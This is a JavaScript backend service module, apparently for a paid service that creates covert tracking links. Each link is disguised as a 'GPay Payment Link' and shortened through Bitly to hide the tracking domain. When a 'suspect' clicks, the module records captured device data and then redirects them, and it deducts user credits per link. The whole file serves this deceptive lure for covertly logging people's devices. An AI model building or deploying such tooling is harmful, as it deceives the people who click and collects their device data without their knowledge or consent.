import { db } from "../firebase/config.js";
import admin from "firebase-admin";
import axios from "axios";
import dotenv from "dotenv";

dotenv.config();

const BITLY_TOKEN = process.env.BITLY_API_TOKEN;
const FRONTEND_URL =
    process.env.FRONTEND_URL || "https://traxalon-main-01.vercel.app";

// ─────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────

export function generateToken() {
    return (
        Math.random().toString(36).substring(2, 10) +
        Math.random().toString(36).substring(2, 10)
    );
}

/**
 * Shorten a URL using the Bitly API.
 * Returns the short URL string, or falls back to the original URL on error.
 */
export async function shortenWithBitly(longUrl) {
    if (!BITLY_TOKEN || BITLY_TOKEN === "YOUR_BITLY_ACCESS_TOKEN_HERE") {
        console.warn("[Bitly] No token set — returning original URL as fallback.");
        return longUrl;
    }
    try {
        const response = await axios.post(
            "https://api-ssl.bitly.com/v4/shorten",
            { long_url: longUrl },
            {
                headers: {
                    Authorization: `Bearer ${BITLY_TOKEN}`,
                    "Content-Type": "application/json",
                },
            }
        );
        return response.data.link; // e.g. "https://bit.ly/AbcXyz"
    } catch (err) {
        console.error("[Bitly] Error shortening URL:", err?.response?.data || err.message);
        // Graceful fallback — still return the raw tracking URL
        return longUrl;
    }
}

// ─────────────────────────────────────────────
// Main service functions
// ─────────────────────────────────────────────

/**
 * Create a tracking link.
 *
 * Flow:
 * 1. Check user exists and has credits
 * 2. Generate token → build tracking URL (/t/:token)
 * 3. Shorten tracking URL via Bitly → bit.ly link (this is what gets shared)
 * 4. Store in Firestore (trackingUrl, shortUrl, destinationUrl)
 * 5. Deduct 1 credit
 * 6. Return { token, trackingUrl, shortUrl }
 *
 * @param {string} uid           Firebase user UID
 * @param {string} label         Optional label / case name
 * @param {string} destinationUrl URL to redirect the suspect to after capture
 */
export async function createTrackingLink(uid, label, destinationUrl) {
    const userRef = db.collection("users").doc(uid);
    const userSnap = await userRef.get();

    if (!userSnap.exists) throw new Error("User not found");

    const userData = userSnap.data();
    if ((userData.credits ?? 0) < 1) throw new Error("Insufficient credits");

    const token = generateToken();
    const trackingUrl = `${FRONTEND_URL}/t/${token}`;

    // Shorten the tracking URL (not the destination) so the shared link is bit.ly
    const shortUrl = await shortenWithBitly(trackingUrl);

    await db.collection("trackingLinks").add({
        uid,
        token,
        label: label || "Tracking Link",
        trackingUrl,
        shortUrl,
        destinationUrl: destinationUrl || null,
        disguisedAs: "GPay Payment Link",
        clicks: 0,
        captures: [],
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        active: true,
    });

    await userRef.update({
        credits: admin.firestore.FieldValue.increment(-1),
        totalLinksGenerated: admin.firestore.FieldValue.increment(1),
    });

    return { token, trackingUrl, shortUrl };
}

/**
 * Record a device capture when a tracking link is clicked.
 */
export async function recordCapture(token, deviceData) {
    const linksRef = db.collection("trackingLinks");
    const snap = await linksRef.where("token", "==", token).get();

    if (snap.empty) return { found: false, destinationUrl: null };

    const linkDoc = snap.docs[0];
    const linkData = linkDoc.data();

    await linksRef.doc(linkDoc.id).update({
        clicks: admin.firestore.FieldValue.increment(1),
        captures: admin.firestore.FieldValue.arrayUnion({
            ...deviceData,
            capturedAt: new Date().toISOString(),
        }),
    });

    return { found: true, destinationUrl: linkData.destinationUrl || null };
}

/**
 * Add credits to a user account.
 */
export async function addCredits(uid, amount) {
    await db
        .collection("users")
        .doc(uid)
        .update({
            credits: admin.firestore.FieldValue.increment(amount),
        });
}